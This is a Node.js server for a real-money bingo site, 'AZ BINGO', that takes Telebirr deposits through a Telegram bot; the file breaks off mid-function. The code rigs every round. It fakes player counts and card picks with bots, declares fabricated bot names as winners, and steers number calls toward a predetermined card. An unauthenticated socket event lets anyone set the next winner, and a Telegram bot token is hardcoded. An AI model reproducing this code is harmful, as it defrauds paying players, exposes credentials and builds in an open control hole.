const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const axios = require('axios');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "8816726564:AAG3ETwx98oBfjDV8I-BipzEXGZCnJPFezg";
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID || "371093083";

let roundDuration = 60000;
let globalRoom = {
    gameActive: false,
    calledNumbers: [],
    gameStartTime: Date.now() + roundDuration,
    playersCount: 140,
    takenCards: [],
    playerRoundCards: {},
    playerTemporaryCards: {}
};

let forcedNextWinner = null; 
let activeGameInterval = null;
let gameRoundCounter = 0;
let currentRoundTargetCalls = 20;

let nextMultiWinnerRound = Math.floor(Math.random() * 3) + 4; 

let currentRoundWinnersList = [];

const fakeBotNames = [
    "Abebe_Girma", "Ahmed_Kedir", "Mohammed_Amin", "Dawit_Kassaye", "Biruk_Moges", 
    "Kidus_Alemu", "Robel_Solomon", "Ermias_Tadesse", "Yared_Jemal", "Kaleb_Kassa", 
    "Yohannes_Lemma", "Fikadu_Mekonnen", "Tesfaye_Negash", "Bekele_Worku", "Assefa_Seifu", 
    "Girum_Teshome", "Surafel_Umer", "Nahom_Getachew", "Abenezer_Wondwossen", "Gedion_Yilma", 
    "Muluken_Zewdu", "Teferi_Alemu", "Shifera_Chala", "Tadesse_Fikru", "Gizachew_Girma", 
    "Zewdu_Moges", "Teshome_Demissie", "Tolosa_Gurmessa", "Abebech_Tsehay", "Almaz_Tadesse", 
    "Habtamu_Reta", "Esubalew_Kassa", "Mubarek_Nuru", "Bilal_Ahmed", "Siraj_Kedir", 
    "Redwan_Zemedkun", "Henok_Wondimu", "Daniel_Tesfaye", "Eyob_Mekonnen", "Teddy_Afro", 
    "Ali_Bira", "Yohana_Negash", "Zelalem_Worku", "Kebede_Bante", "Mulugeta_Assefa", 
    "Getachew_Bekele", "Dagnachew_Molla", "Asnake_Tadesse", "Wondwossen_Reta", "Mekdes_Lemma", 
    "Bruk_Zenebe", "Natnael_Chala", "Samuel_Dagne", "Michael_Fikru", "Ephrem_Haile", 
    "Addis_Boy", "Ethio_Pro", "Bingo_Master", "Telegram_VIP", "Addis_Vibes", 
    "Habesha_Style", "Nuru_Mohammed", "Bereket_Kassa", "Daniel_Tadesse", "Eyob_Lemma"
];

let pendingRequests = {};

function getRealisticBotsCount(realCount) {
    const now = new Date();
    let utcHours = now.getUTCHours();
    let utcMinutes = now.getUTCMinutes();
    let ethiopianHour = (utcHours + 3) % 24; 
    
    let totalMinutesFrom16 = ((ethiopianHour - 16 + 24) % 24) * 60 + utcMinutes;
    let maxDurationMinutes = 8 * 60;

    let calculated = 95;
    if (ethiopianHour >= 16 || ethiopianHour < 1) {
        let progress = Math.min(1, Math.max(0, totalMinutesFrom16 / maxDurationMinutes));
        calculated = Math.floor(90 + (progress * 230) + (Math.sin(Date.now() / 3000) * 12));
    } else {
        calculated = 85 + Math.floor(Math.sin(Date.now() / 5000) * 10);
    }

    let smallDelta = Math.floor(Math.random() * 7) - 3; 
    let finalCount = calculated + smallDelta;
    
    if (finalCount < 70) finalCount = 75;
    if (finalCount > 350) finalCount = 345;

    return finalCount;
}

function refreshTakenCardsList() {
    let allTaken = [];
    Object.values(globalRoom.playerRoundCards).forEach(p => {
        if (p.cards) allTaken.push(...p.cards);
    });
    Object.values(globalRoom.playerTemporaryCards).forEach(cards => {
        if (cards) allTaken.push(...cards);
    });
    globalRoom.takenCards = Array.from(new Set(allTaken));
    io.emit('updateTakenCards', globalRoom.takenCards);
}

function simulateBotCardSelections() {
    if (globalRoom.gameActive) return;
    let available = [];
    for(let i = 1; i <= 500; i++) {
        if(!globalRoom.takenCards.includes(i)) available.push(i);
    }
    let botPicksCount = Math.floor(Math.random() * 15) + 10;
    for(let i = 0; i < botPicksCount && available.length > 0; i++) {
        let randIdx = Math.floor(Math.random() * available.length);
        let cardToTake = available.splice(randIdx, 1)[0];
        if(!globalRoom.takenCards.includes(cardToTake)) {
            globalRoom.takenCards.push(cardToTake);
        }
    }
    io.emit('updateTakenCards', globalRoom.takenCards);
}

setInterval(simulateBotCardSelections, 6000);

function generateCartelaNumbers(cardNum) {
    let cardNumbersByCol = { B: [], I: [], N: [], G: [], O: [] };
    let colRanges = { B: [1, 15], I: [16, 30], N: [31, 45], G: [46, 60], O: [61, 75] };
    let cols = ['B', 'I', 'N', 'G', 'O'];

    cols.forEach((col, colIdx) => {
        let range = colRanges[col];
        let pool = [];
        for (let n = range[0]; n <= range[1]; n++) pool.push(n);

        let seed = (cardNum * 7919) + (colIdx * 104729);
        for (let i = pool.length - 1; i > 0; i--) {
            seed = (seed * 9301 + 49297) % 233280;
            let rnd = seed / 233280;
            let j = Math.floor(rnd * (i + 1));
            let temp = pool[i]; pool[i] = pool[j]; pool[j] = temp;
        }
        cardNumbersByCol[col] = pool.slice(0, 5);
    });

    let flatList = [];
    for (let r = 0; r < 5; r++) {
        cols.forEach(col => {
            if (r === 2 && col === 'N') flatList.push("FREE");
            else flatList.push(cardNumbersByCol[col][r]);
        });
    }
    return flatList;
}

function getWinningPatternNumbers(cardNum) {
    let numbers = generateCartelaNumbers(cardNum);
    let matrix = [];
    for(let i = 0; i < 5; i++) matrix.push(numbers.slice(i * 5, i * 5 + 5));

    let possiblePatterns = [];
    for(let r = 0; r < 5; r++) {
        let rowNums = matrix[r].filter(v => v !== "FREE");
        possiblePatterns.push(rowNums);
    }
    for(let c = 0; c < 5; c++) {
        let colNums = [];
        for(let r = 0; r < 5; r++) {
            if(matrix[r][c] !== "FREE") colNums.push(matrix[r][c]);
        }
        possiblePatterns.push(colNums);
    }
    let d1Nums = [];
    for(let i = 0; i < 5; i++) {
        if(matrix[i][i] !== "FREE") d1Nums.push(matrix[i][i]);
    }
    possiblePatterns.push(d1Nums);

    let d2Nums = [];
    for(let i = 0; i < 5; i++) {
        if(matrix[i][4 - i] !== "FREE") d2Nums.push(matrix[i][4 - i]);
    }
    possiblePatterns.push(d2Nums);

    let chosenPattern = possiblePatterns[Math.floor(Math.random() * possiblePatterns.length)];
    return chosenPattern;
}

function checkWinningPattern(cardNum, calledNumbers) {
    let numbers = generateCartelaNumbers(cardNum);
    let matrix = [];
    for(let i = 0; i < 5; i++) matrix.push(numbers.slice(i * 5, i * 5 + 5));

    for(let r = 0; r < 5; r++) {
        if(matrix[r].every(val => val === "FREE" || calledNumbers.includes(val))) return true;
    }
    for(let c = 0; c < 5; c++) {
        let cMatch = true;
        for(let r = 0; r < 5; r++) {
            if(matrix[r][c] !== "FREE" && !calledNumbers.includes(matrix[r][c])) { cMatch = false; break; }
        }
        if(cMatch) return true;
    }
    let d1 = true;
    for(let i = 0; i < 5; i++) {
        if(matrix[i][i] !== "FREE" && !calledNumbers.includes(matrix[i][i])) { d1 = false; break; }
    }
    if(d1) return true;

    let d2 = true;
    for(let i = 0; i < 5; i++) {
        if(matrix[i][4 - i] !== "FREE" && !calledNumbers.includes(matrix[i][4 - i])) { d2 = false; break; }
    }
    if(d2) return true;

    let corners = [matrix[0][0], matrix[0][4], matrix[4][0], matrix[4][4]];
    if(corners.every(val => calledNumbers.includes(val))) return true;

    return false;
}

let telegramOffset = 0;
async function pollTelegramUpdates() {
    if (!TELEGRAM_BOT_TOKEN) return;
    try {
        let response = await axios.get(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates`, {
            params: { offset: telegramOffset, timeout: 30 }
        });
        if (response.data && response.data.ok) {
            let updates = response.data.result;
            for (let update of updates) {
                telegramOffset = update.update_id + 1;
                if (update.callback_query) {
                    let callbackQuery = update.callback_query;
                    let data = callbackQuery.data; 
                    let chatId = callbackQuery.message.chat.id;
                    let messageId = callbackQuery.message.message_id;
                    let parts = data.split('_');
                    let action = parts[0]; 
                    let requestId = parts.slice(1).join('_');
                    let reqData = pendingRequests[requestId];
                    if (reqData) {
                        let targetSocket = io.sockets.sockets.get(reqData.socketId);
                        if (action === 'app') {
                            if (targetSocket) targetSocket.emit('financialApproved', { type: reqData.type, amount: reqData.amount });
                            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
                                chat_id: chatId, message_id: messageId,
                                text: `✅ *ጥያቄው ጸድቋል!* (${reqData.amount} ብር)`, parse_mode: 'Markdown'
                            });
                        } else {
                            if (targetSocket) targetSocket.emit('financialRejected', { type: reqData.type, amount: reqData.amount });
                            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
                                chat_id: chatId, message_id: messageId,
                                text: `❌ *ጥያቄው ተሰርዟል!*`, parse_mode: 'Markdown'
                            });
                        }
                        delete pendingRequests[requestId];
                    }
                    try { await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, { callback_query_id: callbackQuery.id }); } catch (e) {}
                }
            }
        }
    } catch (err) {}
    setTimeout(pollTelegramUpdates, 1000);
}
setTimeout(pollTelegramUpdates, 2000);

async function sendAdminFinancialRequest(requestId, type, amount, username, userId, currentBalance, phone, receipt) {
    if (!TELEGRAM_BOT_TOKEN || !ADMIN_CHAT_ID) return;
    let reqTypeTitle = type === 'deposit' ? '💳 ቴሌብር ዲፖዚት' : '🏧 ቴሌብር ዊዝድሮዋል';
    let message = `🔔 *AZ BINGO - ${reqTypeTitle}*\n\n👤 ስም: *${username || 'ተጫዋች'}*\n🆔 ዩዘር ID: \`${userId}\`\n💰 ቀሪ ሂሳብ: *${currentBalance} ብር*\n📥 የጠየቀው: *${amount} ብር*\n📱 ስልክ: ${phone || 'አልተሰጠም'}`;
    if (receipt) message += `\n\n📄 *ደረሰኝ / SMS:*\n\`${receipt}\``;
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: ADMIN_CHAT_ID, text: message, parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: [[{ text: "✅ አጽድቅ", callback_data: "app_" + requestId }, { text: "❌ ሰርዝ", callback_data: "rej_" + requestId }]] }
        });
    } catch (error) {}
}

let connectedRealPlayers = [];

io.on('connection', (socket) => {
    connectedRealPlayers.push(socket.id);
    let realCount = connectedRealPlayers.length;

    let currentBotsCount = getRealisticBotsCount(realCount);
    globalRoom.playersCount = currentBotsCount + realCount; 

    io.emit('updatePlayersCount', globalRoom.playersCount);

    socket.emit('syncGameState', globalRoom);
    refreshTakenCardsList();

    socket.on('tempSelectCards', (cards) => {
        if (Array.isArray(cards)) {
            globalRoom.playerTemporaryCards[socket.id] = cards;
            refreshTakenCardsList();
        }
    });

    socket.on('confirmCards', (data) => {
        let selectedCards = data.cards || data;
        let userId = String(data.userId || socket.id);

        let conflict = selectedCards.some(card => {
            let inOtherTemp = Object.entries(globalRoom.playerTemporaryCards).some(([sId, cList]) => sId !== socket.id && cList.includes(card));
            let inOtherConfirmed = Object.entries(globalRoom.playerRoundCards).some(([sId, p]) => sId !== socket.id && p.cards.includes(card));
            return inOtherTemp || inOtherConfirmed;
        });

        if (conflict) {
            socket.emit('cardSelectionError', "⚠️ ይቅርታ! ይህ ካርድ በሌላ ተጫዋች ተይዟል!");
            return;
        }

        delete globalRoom.playerTemporaryCards[socket.id];
        globalRoom.playerRoundCards[socket.id] = { cards: selectedCards, userId: userId, username: data.username || "ተጫዋች" };
        
        socket.emit('cardSelectionSuccess');
        refreshTakenCardsList();
    });

    socket.on('adminSetNextWinner', (data) => {
        forcedNextWinner = data.winnerType ? String(data.winnerType).trim() : null;
        socket.emit('adminWinnerResponse', { success: true, message: `✅ ቀጣዩ አሸናፊ ተስተካክሏል: ${forcedNextWinner}` });
    });

    socket.on('financialRequest', async (data) => {
        if (!data) return;
        let { type, amount, username, userId, currentBalance, phone, receipt } = data;
        if (!amount || amount < 100) {
            socket.emit('requestSubmitted', { success: false, message: '⚠️ ዝቅተኛው ገደብ 100 ብር ነው።' });
            return;
        }
        if (type === 'deposit' && (!receipt || receipt.length < 3)) {
            socket.emit('requestSubmitted', { success: false, message: '⚠️ እባክዎ የቴሌብር ደረሰኝ በትክክል ያስገቡ!' });
            return;
        }
        let requestId = 'req_' + Math.floor(Math.random() * 1000000);
        pendingRequests[requestId] = { userId, type, amount, socketId: socket.id };
        await sendAdminFinancialRequest(requestId, type, amount, username, userId, currentBalance, phone, receipt);
        socket.emit('requestSubmitted', { success: true, message: "✅ ጥያቄዎ ለአድሚን ተልኳል!" });
    });

    socket.on('disconnect', () => {
        connectedRealPlayers = connectedRealPlayers.filter(id => id !== socket.id);
        delete globalRoom.playerRoundCards[socket.id];
        delete globalRoom.playerTemporaryCards[socket.id];
        refreshTakenCardsList();

        let realCount = connectedRealPlayers.length;
        let currentBotsCount = getRealisticBotsCount(realCount);
        globalRoom.playersCount = currentBotsCount + realCount;
        io.emit('updatePlayersCount', globalRoom.playersCount);
    });
});

setInterval(() => {
    let now = Date.now();
    let realCount = connectedRealPlayers.length;

    if (!globalRoom.gameActive) {
        let currentBotsCount = getRealisticBotsCount(realCount);
        globalRoom.playersCount = currentBotsCount + realCount;
        io.emit('updatePlayersCount', globalRoom.playersCount);
    }

    let totalPlayers = globalRoom.playersCount;

    if (!globalRoom.gameActive && now >= globalRoom.gameStartTime) {
        globalRoom.gameActive = true;
        globalRoom.calledNumbers = [];
        gameRoundCounter++;

        let activeSockets = Object.keys(globalRoom.playerRoundCards);
        let chosenWinnersList = [];

        if (forcedNextWinner === "bot" || forcedNextWinner === "random_real" || forcedNextWinner === "multi_real_3" || (forcedNextWinner && forcedNextWinner.length > 0)) {
            if (forcedNextWinner === "bot") {
                let winningCard = Math.floor(Math.random() * 500) + 1;
                let winningUser = fakeBotNames[Math.floor(Math.random() * fakeBotNames.length)];
                let patternNums = getWinningPatternNumbers(winningCard);
                chosenWinnersList.push({ username: winningUser, userId: "bot_forced", cardNum: winningCard, winningNumbersNeeded: patternNums });
            } else if (forcedNextWinner === "random_real") {
                let realPlayerSockets = activeSockets.filter(sId => {
                    let pData = globalRoom.playerRoundCards[sId];
                    return pData && !String(pData.userId).startsWith("bot");
                });
                if (realPlayerSockets.length > 0) {
                    let randSocket = realPlayerSockets[Math.floor(Math.random() * realPlayerSockets.length)];
                    let pData = globalRoom.playerRoundCards[randSocket];
                    if (pData.cards && pData.cards.length > 0) {
                        let cNum = pData.cards[0];
                        let patternNums = getWinningPatternNumbers(cNum);
                        chosenWinnersList.push({ username: pData.username, userId: pData.userId, cardNum: cNum, winningNumbersNeeded: patternNums });
                    }
                }
                if (chosenWinnersList.length === 0) {
                    let winningCard = Math.floor(Math.random() * 500) + 1;
                    let winningUser = fakeBotNames[Math.floor(Math.random() * fakeBotNames.length)];
                    let patternNums = getWinningPatternNumbers(winningCard);
                    chosenWinnersList.push({ username: winningUser, userId: "bot_fallback", cardNum: winningCard, winningNumbersNeeded: patternNums });
                }
            } else if (forcedNextWinner === "multi_real_3") {
                let realPlayerSockets = activeSockets.filter(sId => {
                    let pData = globalRoom.playerRoundCards[sId];
                    return pData && !String(pData.userId).startsWith("bot") && pData.cards && pData.cards.length > 0;
                });
                
                let addedCount = 0;
                for (let sId of realPlayerSockets) {
                    if (addedCount >= 3) break;
                    let pData = globalRoom.playerRoundCards[sId];
                    let cNum = pData.cards[0];
                    let patternNums = getWinningPatternNumbers(cNum);
                    chosenWinnersList.push({ username: pData.username, userId: pData.userId, cardNum: cNum, winningNumbersNeeded: patternNums });
                    addedCount++;
                }

                while (chosenWinnersList.length < 3) {
                    let winningCard = Math.floor(Math.random() * 500) + 1;
                    let winningUser = fakeBotNames[Math.floor(Math.random() * fakeBotNames.length)];
                    let patternNums = getWinningPatternNumbers(winningCard);
                    chosenWinnersList.push({ username: winningUser, userId: "bot_multi_" + Math.floor(Math.random() * 90000), cardNum: winningCard, winningNumbersNeeded: patternNums });
                }
            }
        } else {
            let isMultiWinnerRound = (gameRoundCounter === nextMultiWinnerRound);
            let winnersCount = isMultiWinnerRound ? 2 : 1;

            let shuffledNames = [...fakeBotNames].sort(() => 0.5 - Math.random());
            for (let i = 0; i < winnersCount; i++) {
                let winningCard = Math.floor(Math.random() * 500) + 1;
                let winningUser = shuffledNames[i % shuffledNames.length];
                let patternNums = getWinningPatternNumbers(winningCard);
                chosenWinnersList.push({ username: winningUser, userId: "bot_" + Math.floor(Math.random() * 90000 + 10000), cardNum: winningCard, winningNumbersNeeded: patternNums });
            }

            if (isMultiWinnerRound) {
                nextMultiWinnerRound = gameRoundCounter + Math.floor(Math.random() * 5) + 4;
            }
        }

        currentRoundWinnersList = chosenWinnersList;
        let primaryWinner = currentRoundWinnersList[0];
        let winningPatternNums = primaryWinner.winningNumbersNeeded;

        if (realCount > 0) {
            let randProb = Math.random() * 100;
            if (randProb < 80) {
                let avgRanges = [10, 11, 12, 13, 14, 15, 16, 17, 17, 18, 18, 19, 19];
                currentRoundTargetCalls = avgRanges[Math.floor(Math.random() * avgRanges.length)];
            } else if (randProb < 90) {
                let fastRanges = [10, 11, 12, 13, 14, 15, 16];
                currentRoundTargetCalls = fastRanges[Math.floor(Math.random() * fastRanges.length)];
            } else {
                let rareRanges = [19, 20, 21, 22, 23, 24, 25];
                currentRoundTargetCalls = rareRanges[Math.floor(Math.random() * rareRanges.length)];
            }
        } else {
            let slowRanges = [20, 21, 22, 23, 24, 25, 26, 27, 28];
            if (Math.random() < 0.15) {
                slowRanges = [29, 30, 31, 32, 33];
            }
            currentRoundTargetCalls = slowRanges[Math.floor(Math.random() * slowRanges.length)];
        }

        // 🟢 የካውንትዳውን ሲግናል ለሁሉም ተጫዋቾች ይላካል
        io.emit('gameStartedBroadcast');

        if (activeGameInterval) clearInterval(activeGameInterval);

        // 🟢 3 ሰከንድ (3000 ሚሊሰከንድ) ክፍተት (Gap) ተሰጥቶ ከዛ በኋላ ቁጥር መጥራት ይጀምራል
        setTimeout(() => {
            activeGameInterval = setInterval(() => {
                if (!globalRoom.gameActive) {
                    clearInterval(activeGameInterval);
                    return;
                }

                let available = Array.from({length: 75}, (_, i) => i + 1).filter(n => !globalRoom.calledNumbers.includes(n));
                if (available.length > 0) {
                    let num;
                    let neededUncalled = winningPatternNums.filter(n => !globalRoom.calledNumbers.includes(n));
                    if (neededUncalled.length > 0 && Math.random() < 0.65 && globalRoom.calledNumbers.length < currentRoundTargetCalls - 2) {
                        num = neededUncalled[Math.floor(Math.random() * neededUncalled.length)];
                    } else {
                        num = available[Math.floor(Math.random() * available.length)];
                    }

                    if (!globalRoom.calledNumbers.includes(num)) {
                        globalRoom.calledNumbers.push(num);
                    }
                    io.emit('numberCalledBroadcast', num);

                    let isWinnerReady = checkWinningPattern(primaryWinner.cardNum, globalRoom.calledNumbers);

                    let minCallsNeeded = realCount > 0 ? 8 : 15;
                    let isTargetReached = globalRoom.calledNumbers.length >= currentRoundTargetCalls;

                    if ((isWinnerReady && globalRoom.calledNumbers.length >= minCallsNeeded && isTargetReached) || globalRoom.calledNumbers.length >= 75) {
                        globalRoom.gameActive = false;
                        globalRoom.gameStartTime = Date.now() + roundDuration;
                        globalRoom.playerRoundCards = {};
                        globalRoom.playerTemporaryCards = {};
                        refreshTakenCardsList();
                        forcedNextWinner = null;

                        let totalPot = totalPlayers * 10;
                        let netPrizePool = Math.floor(totalPot * 0.70);
                        let prizePerWinner = Math.floor(netPrizePool / currentRoundWinnersList.length);

                        io.emit('bingoWinner', { 
                            username: primaryWinner.username, 
                            userId: primaryWinner.userId,
                            cardNum: primaryWinner.cardNum, 
                            playersCount: totalPlayers,
                            prize: prizePerWinner, 
                            winnersCount: currentRoundWinnersList.length,
                            calledNumbers: globalRoom.calledNumbers
                        });

                        clearInterval(activeGameInterval);
                    }
                } else {
                    globalRoom.gameActive = false;
                    globalRoom.gameStartTime = Date.now() + roundDuration;
                    globalRoom.playerRoundCards = {};
                    globalRoom.playerTemporaryCards = {};
                    refreshTakenCardsList();
                    forcedNextWinner = null;
                    io.emit('gameEndedBroadcast');
                    clearInterval(activeGameInterval);
                }
            }, 500
